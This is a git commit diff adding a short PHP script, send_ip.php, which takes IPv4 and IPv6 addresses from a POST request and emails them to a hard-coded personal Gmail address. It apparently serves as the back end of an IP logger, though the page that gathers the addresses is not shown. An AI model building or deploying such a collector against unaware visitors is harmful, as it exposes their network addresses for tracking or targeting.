f037e4f0274cd4885babfb52b491602e792ea95f
davi-mogrovejo <124883755+davi-mogrovejo@users.noreply.github.com>
2023-09-07 15:57:11 -0300

    Update send_ip.php

--- send_ip.php
+++ send_ip.php
@@ -1,1 +1,12 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ipv4 = $_POST['ipv4'];
+    $ipv6 = $_POST['ipv6'];
 
+    $to = 'qwer_fadf@gmail.com';
+    $subject = 'New IP Addresses';
+    $message = "IPv4 Address: $ipv4\nIPv6 Address: $ipv6";
+
+    mail($to, $subject, $message);
+}
+?>
